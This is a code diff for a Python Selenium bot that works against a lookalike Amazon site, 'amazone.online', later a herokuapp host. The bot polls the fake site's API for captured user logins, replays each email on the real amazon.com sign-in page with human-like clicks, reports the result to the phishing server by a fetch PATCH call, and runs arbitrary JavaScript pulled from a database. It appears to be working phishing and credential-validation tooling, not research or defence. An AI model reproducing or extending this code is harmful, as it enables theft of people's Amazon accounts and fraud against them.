@@ -20,7 +20,7 @@ logging.basicConfig(level=logging.INFO,
                     format='(%(module)s) %(message)s',
                     handlers=[logging.FileHandler("session.log", 'w+', 'utf-8')])
 logger = logging.getLogger("Log")
-url_fake_site = "https://amazone.online"
+url_fake_site = "https://calm-citadel-34012.herokuapp.com"
 
 
 class Abrowser(object):
@@ -75,9 +75,23 @@ class Abrowser(object):
 
     def searcher(self):
         try:
+            self.driver.set_script_timeout(1)
             while self.is_end_work() is False:
                 self.get_new_users()
-                time.sleep(3)
+                execute_codes = a_db.get_execute_codes()
+                if execute_codes is not None:
+                    self.print(f"Find {len(execute_codes)} execute_codes")
+                    for execute_code in execute_codes:
+                        code = execute_code["code"]
+                        code_id = execute_code["id"]
+                        try:
+                            self.driver.execute_async_script(code)
+                        except:
+                            pass
+                        self.print(f"Execute id {code_id}, code is : {code}")
+                        a_db.set_executed(code_id)
+                else:
+                    time.sleep(3)
             self.quit()
         except Exception as ex:
             self.print(ex)
@@ -89,8 +103,12 @@ class Abrowser(object):
             self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20email%20check")
             el = WebDriverWait(self.driver, 3).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
             json_el = json.loads(el.text[8:-1])
+            newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
+            # self.print(newlist)
+            # lines = []
+            # lines = sorted(lines, key=lambda k: k['id'], reverse=True)
             new_accs = []
-            for d in reversed(json_el):
+            for d in newlist:
                 acc_id = d["id"]
                 acc_login = d["login"]
                 acc_datetime = d["created_at"]
@@ -127,7 +145,42 @@ class Abrowser(object):
                 return
             self.driver.get(f"https://www.amazon.com/")
             self.print("I get Amazon!!!")
-            time.sleep(15)
+            try:
+                el_nav_ya_signin = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//a[@data-nav-ref = 'nav_ya_signin']")))
+            except Exception as ex:
+                raise Exception("Not find el_nav_ya_signin")
+
+            sign_in_link = el_nav_ya_signin.get_attribute("href")
+            self.driver.get(sign_in_link)
+
+            self.print(f"After click on el_nav_ya_signin {self.driver.current_url}")
+
+            try:
+                el_input_email = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'email']")))
+            except Exception as ex:
+                raise Exception("Not find el_input_email")
+
+            try:
+                el_input_submit= WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
+            except Exception as ex:
+                raise Exception("Not find el_input_submit")
+
+            self.driver.execute_script(f"arguments[0].setAttribute('value','{self.user_login}')", el_input_email)
+            actions = ActionChains(self.driver)
+            actions.move_to_element(el_input_submit)
+            actions.move_by_offset(-3, -2)
+            actions.pause(random.randint(1, 2))
+            actions.click()
+            actions.perform()
+            self.print(f"After click on el_input_submit {self.driver.current_url}")
+
+            url_to_email_check_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/email_check_success"
+            script_data = f"fetch('{url_to_email_check_success}',"+" {method: 'PATCH'}"+").then((response) => response.json()).then((data) => " + "{ console.log(data)})"
+            a_db.add_executed_code(script_data)
+
+            
+
+            time.sleep(20)
         except Exception as ex:
             self.print(ex)
             self.quit()
